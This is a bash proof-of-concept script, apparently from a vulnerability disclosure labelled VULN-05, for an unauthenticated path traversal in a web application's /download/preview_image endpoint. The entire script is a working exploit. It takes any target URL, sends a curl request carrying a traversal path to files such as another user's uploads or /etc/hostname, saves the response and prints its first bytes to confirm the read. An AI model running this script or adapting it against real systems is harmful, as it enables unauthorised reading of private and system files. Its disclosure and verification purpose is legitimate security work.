#!/usr/bin/env bash
# VULN-05 — Unauthenticated path traversal / file read
# Researcher: tal7aouy
# Usage: ./poc.sh https://target "../../../../../../etc/hostname.png"
set -euo pipefail
TARGET="${1:-http://localhost}"
TRAVERSAL="${2:-../../../../../../home/other/uploads/secret.png}"

echo "[*] VULN-05 — requesting: path=$TRAVERSAL  (no authentication)"
curl -sk -G "${TARGET%/}/download/preview_image" \
  --data-urlencode "path=${TRAVERSAL}" \
  -o tal7aouy05_out.bin -w "    HTTP %{http_code}  bytes=%{size_download}\n"

echo "[*] First bytes of the retrieved file:"
head -c 64 tal7aouy05_out.bin | xxd | head -n 4 || true
echo
echo "[*] If the bytes match the target file (not the placeholder image), read is confirmed."
